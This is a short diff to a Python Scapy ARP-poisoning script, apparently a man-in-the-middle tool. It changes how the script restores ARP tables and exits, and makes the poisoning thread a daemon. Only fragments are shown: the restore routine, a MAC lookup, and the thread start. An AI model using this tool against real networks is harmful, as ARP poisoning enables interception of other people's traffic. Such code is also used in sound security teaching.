@@ -23,7 +23,8 @@ def restore_target(gateway_ip,gateway_mac,target_ip,target_mac):
     send(ARP(op=2, psrc=target_ip,pdst=gateway_ip,hwdst="ff:ff:ff:ff:ff:ff",hwsrc=target_mac),count=5)
 
     # signals the main thread to exit
-    os.kill(os.getpid(), signal.SIGINT)
+    # os.kill(os.getpid(), signal.SIGINT)
+    sys.exit(3)
 
 def get_mac(ip_address):
     responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address),timeout=2,retry=10) 
@@ -77,6 +78,8 @@ else:
 
 # start poison thread
 poison_thread = threading.Thread(target=posion_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
+# ensure when sys.exit is send the thread ends.
+poison_thread.daemon = True
 poison_thread.start()
 
 try:
